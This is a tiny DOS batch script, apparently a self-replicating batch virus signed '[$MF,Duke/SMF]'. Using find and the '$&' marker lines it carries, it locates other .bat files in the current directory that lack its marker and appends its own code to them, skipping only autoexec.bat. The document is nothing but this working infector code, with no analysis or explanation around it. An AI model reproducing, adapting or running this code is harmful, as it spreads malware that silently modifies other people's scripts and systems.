@echo off %$&%
for %%b in (*.bat) do set $&=%%b
if "%$&%=="autoexec.bat goto $&
find "$&"<%$&%>nul
if errorlevel 1 find "$&"<%0>>%$&%
:$& [$MF,Duke/SMF]
